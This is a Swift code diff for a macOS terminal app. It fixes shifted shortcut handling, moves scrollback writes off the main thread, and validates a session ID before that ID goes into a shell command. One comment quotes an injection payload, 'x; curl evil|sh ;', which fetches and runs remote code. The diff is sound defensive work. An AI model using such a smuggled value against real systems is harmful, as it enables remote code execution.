@@ -528,7 +528,11 @@ final class GhosttySurfaceNSView: NSView {
         guard event.modifierFlags.contains(.command) else { return false }
         let chars = event.charactersIgnoringModifiers ?? ""
         let appShortcuts: Set<String> = ["k", "n", "t", "w", "q", ","]
-        if appShortcuts.contains(chars) { return false }
+        // charactersIgnoringModifiers still applies Shift, so a shifted app
+        // shortcut (⌘⇧K "Jump to waiting", ⌘⇧T "New worktree") arrives here as
+        // "K"/"T". Lowercase before matching so those reach the menu instead of
+        // being swallowed and typed into the terminal.
+        if appShortcuts.contains(chars.lowercased()) { return false }
 
         // Font zoom: ⌘+ / ⌘- / ⌘0 (⌘= and ⌘⇧= both map to "+"/"=").
         switch chars {
@@ -817,7 +821,19 @@ enum RestoreCommand {
             // session is essentially never lost. Never `claude --continue`: it
             // resumes the folder's most recent conversation, which may belong to
             // a different terminal.
-            commands.append("claude --resume \(claudeID) || claude --resume || claude")
+            //
+            // claudeID is interpolated into an executed shell line and its source
+            // (a transcript filename, or a hook-recorded id) is not trusted. A
+            // real session id is only letters, digits and hyphens; anything else
+            // (a crafted `x; curl evil|sh ;` transcript name) drops to Claude's
+            // interactive picker rather than running attacker-controlled text.
+            let idIsSafe = !claudeID.isEmpty
+                && claudeID.allSatisfy { $0.isLetter || $0.isNumber || $0 == "-" }
+            if idIsSafe {
+                commands.append("claude --resume \(claudeID) || claude --resume || claude")
+            } else {
+                commands.append("claude --resume || claude")
+            }
         }
 
         var script = commands.isEmpty ? "" : commands.joined(separator: "\n") + "\n"
@@ -855,9 +871,12 @@ final class TerminalRegistry {
             let name = Durable.sessionName(for: session.id)
             // Answered from the batch `applyRestore` resolved off-main, never by
             // asking tmux here: this runs on the main thread, once per terminal,
-            // while the UI is coming up. Outside a restore the answer is unused
-            // anyway — there is nothing to replay — and a terminal being created
-            // now has a fresh id no tmux session can match.
+            // while the UI is coming up. The set is guaranteed complete by the
+            // time any restored session can reach this code — `applyRestore`
+            // resolves it BEFORE publishing the sessions (see `finishRestore`).
+            // Outside a restore the answer is unused anyway — there is nothing
+            // to replay — and a terminal being created now has a fresh id no
+            // tmux session can match.
             reattachingToLiveAgent =
                 appState.isRestoring && appState.restoreLiveDurableIDs.contains(session.id)
             command = Durable.attachCommand(
@@ -934,28 +953,49 @@ final class TerminalRegistry {
     /// Persist each live surface's scrollback (plain text) into `dir`, so the
     /// terminal history survives a restart. Capped per session to stay small.
     /// Files are user-only (0600) since scrollback can contain secrets.
-    func saveScrollback(to dir: URL) {
-        try? FileManager.default.createDirectory(
-            at: dir, withIntermediateDirectories: true,
-            attributes: [.posixPermissions: 0o700])
+    ///
+    /// The capture must stay on the main actor (a surface read locks the
+    /// renderer), but the file writes must not: this runs on every
+    /// resign-active/hide, and N synchronous writes on the main thread were a
+    /// visible hitch on every app switch. `sync` forces synchronous writes for
+    /// the one moment that needs them — quit, where a detached write would race
+    /// process exit.
+    func saveScrollback(to dir: URL, sync: Bool = false) {
+        var writes: [(url: URL, text: String)] = []
+        var removals: [URL] = []
         for (id, view) in views {
             // Scrollback (visual history).
             if let text = view.readScrollback(), !text.isEmpty {
-                let capped = String(text.suffix(200_000))
-                let url = dir.appendingPathComponent("\(id.uuidString).txt")
-                if (try? capped.write(to: url, atomically: true, encoding: .utf8)) != nil {
-                    try? FileManager.default.setAttributes([.posixPermissions: 0o600], ofItemAtPath: url.path)
-                }
+                writes.append((
+                    dir.appendingPathComponent("\(id.uuidString).txt"),
+                    String(text.suffix(200_000))))
             }
             // Unsent input at the prompt (best-effort) — write, or clear stale.
             let inputURL = dir.appendingPathComponent("\(id.uuidString).input")
             if let pending = view.capturedPendingInput() {
-                if (try? pending.write(to: inputURL, atomically: true, encoding: .utf8)) != nil {
-                    try? FileManager.default.setAttributes([.posixPermissions: 0o600], ofItemAtPath: inputURL.path)
-                }
+                writes.append((inputURL, pending))
             } else {
-                try? FileManager.default.removeItem(at: inputURL)
+                removals.append(inputURL)
             }
+        }
+        let work: @Sendable () -> Void = { [writes, removals] in
+            try? FileManager.default.createDirectory(
+                at: dir, withIntermediateDirectories: true,
+                attributes: [.posixPermissions: 0o700])
+            for (url, text) in writes {
+                if (try? text.write(to: url, atomically: true, encoding: .utf8)) != nil {
+                    try? FileManager.default.setAttributes(
+                        [.posixPermissions: 0o600], ofItemAtPath: url.path)
+                }
+            }
+            for url in removals {
+                try? FileManager.default.removeItem(at: url)
+            }
+        }
+        if sync {
+            work()
+        } else {
+            DispatchQueue.global(qos: .utility).async(execute: work)
         }
     }
 }
